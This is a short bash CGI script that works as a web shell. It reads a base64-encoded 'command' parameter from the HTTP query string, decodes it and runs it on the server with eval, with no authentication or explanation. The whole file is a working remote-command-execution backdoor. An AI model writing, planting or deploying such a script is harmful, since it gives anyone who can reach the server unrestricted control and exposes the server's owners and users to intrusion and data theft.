#!/bin/bash

echo "Content-type: text/html"
echo ""

command=`echo "$QUERY_STRING" | sed -n 's/^.*command=\([^&]*\).*$/\1/p' | base64 --decode | sed "s/%20/ /g" | sed "s/+/ /g"`
eval $command

